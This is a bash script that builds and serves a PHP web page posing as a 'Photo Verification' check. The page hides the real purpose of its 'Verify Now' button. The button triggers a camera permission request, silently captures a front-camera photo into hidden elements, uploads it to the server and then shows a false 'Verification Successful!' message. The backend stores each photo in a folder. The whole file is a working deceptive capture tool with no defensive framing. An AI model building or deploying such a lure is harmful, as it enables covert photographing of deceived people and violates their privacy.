#!/bin/bash

echo "[+] Setting up PHP server and web files..."

# 1. Main HTML Page with Camera Capture Script
cat << 'EOF' > index.php
<!DOCTYPE html>
<html>
<head>
    <title>Photo Verification</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f4f4f9; }
        .box { background: white; padding: 20px; border-radius: 8px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
        button { background: #28a745; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Click to Verify</h2>
        <p>Please click the button below to continue.</p>
        <button onclick="startCapture()">Verify Now</button>
    </div>

    <!-- Hidden Video and Canvas Elements -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
    function startCapture() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
            var video = document.getElementById('video');
            video.srcObject = stream;
            
            // Wait for video to load and capture frame
            setTimeout(function() {
                var canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                var context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                var imageData = canvas.toDataURL('image/jpeg');
                
                // Send image data to PHP server
                fetch('upload.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                }).then(response => {
                    alert('Verification Successful!');
                    stream.getTracks().forEach(track => track.stop());
                });
            }, 1500);
        })
        .catch(function(error) {
            alert("Camera permission denied or not available.");
        });
    }
    </script>
</body>
</html>
EOF

# 2. PHP Backend to Receive and Save the Image
cat << 'EOF' > upload.php
<?php
$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['image'])) {
    $img = $data['image'];
    $img = str_replace('data:image/jpeg;base64,', '', $img);
    $img = str_replace(' ', '+', $img);
    $decodedData = base64_decode($img);

    // Create a folder for saved images if it doesn't exist
    if (!file_exists('captured_images')) {
        mkdir('captured_images', 0777, true);
    }

    $fileName = 'captured_images/photo_' . time() . '.jpg';
    file_put_contents($fileName, $decodedData);
    echo "Saved successfully";
}
?>
EOF

echo "[+] Files created successfully!"
echo "[+] Starting PHP server on port 3333..."
php -S 127.0.0.1:3333
